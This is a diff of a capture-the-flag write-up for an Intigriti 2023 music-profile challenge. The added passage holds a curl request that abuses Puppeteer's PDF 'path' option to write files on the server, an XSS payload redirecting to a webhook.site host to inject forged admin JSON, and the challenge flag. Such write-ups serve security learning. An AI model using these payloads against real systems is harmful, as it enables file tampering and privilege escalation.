@@ -162,7 +162,7 @@ The generate function will send a `POST` method to `/profile/generate-profile-ca
 
 ![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_21.png)
 
-The PDF generated will have all the value of parameters `username,firstname,lastname,spotifyTrackCode`.
+The PDF generator will have all the value of parameters `username,firstname,lastname,spotifyTrackCode`.
 
 ![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_22.png)
 
@@ -306,7 +306,7 @@ const userExists = (loginHash) => {
 }
 ```
 
-So `getUser()` will get us the `JSON` value of our user which will holds parameters such as `username, firstName, ` as shown inside the codes below.
+So `getUser()` will get us the `JSON` value of our user which will holds parameters such as `username,firstname,lastname,spotifyTrackCode ` as shown inside the codes below and there is no `isAdmin`
 
 **controllers/user.js**
 
@@ -373,3 +373,41 @@ const generatePDF = async (userData, userOptions) => {
 }
 ...
 ```
+
+Maybe this is the path for us to write the JSON with `isAdmin`? After reading the documentation in [here](https://pptr.dev/api/puppeteer.pdfoptions), there is one options that we can use called `path` to output and save the file somewhere in locally.
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_26.png)
+
+Let's try save the our PDF in `/app/data/test.json`, then try read the file by generate the PDF.
+
+```bash
+curl -k -X POST -H 'Content-Type: application/json' -b 'login_hash=f024b76b41f9dba21cf620484862e9b90465d8db09ea946fb04a0f6f3876103a' https://mymusic.ctf.intigriti.io/profile/generate-profile-card -d '{"userOptions":{"path":"/app/data/test.json"}}'
+```
+
+Nice! We could write something using this method.
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_27.png)
+
+Next step would be on how could we write the payload below somewhere in the server. We know that it will save as **PDF** not a **JSON** file in the content.
+
+```js
+{'username':'a','firstName':'a','lastName':'b','spotifyTrackCode':'c','isAdmin':'true'}
+```
+
+What if we store this JSON in our webhook server and redirect it using XSS to reflect the content into the file? Let's give it a try
+
+```cs
+<img src=x onerror=document.location='https://webhook.site/edf38419-6f01-4b60-aa0e-2428b2089bef'>
+```
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_28.png)
+
+Let's generate it and store it in `/app/data/test.json`. It still saved it as PDF format.
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_29.png)
+
+But let's give it a try to load it in `login_hash`
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_30.png)
+
+Flag : `INTIGRITI{0verr1d1ng_4nd_n0_r3turn_w4s_n3ed3d_for_th15_fl4g_to_b3_e4rn3d}`
